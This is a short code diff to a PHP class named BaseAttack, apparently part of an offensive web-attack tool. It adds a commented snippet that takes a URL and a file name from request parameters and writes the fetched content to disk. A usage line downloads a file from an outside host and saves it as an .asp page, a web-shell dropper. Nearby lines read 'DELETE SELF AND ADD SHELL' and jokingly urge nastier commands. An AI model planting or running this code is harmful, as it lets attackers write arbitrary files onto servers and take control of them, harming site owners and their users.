@@ -19,6 +19,12 @@ class BaseAttack {
 	 *       可以试试更变态的命令，不要干坏事哦！
 	 *******************************************************/
 
+	/*
+	 * $str=file_get_contents($_GET[‘url’]);
+        echo file_put_contents($_GET[‘file’],$str);
+        //use: ?url=http://www.sswowo.com/1.txt&file=3.asp
+	 */
+
     /**
      * DELETE SELF AND ADD SHELL
      */
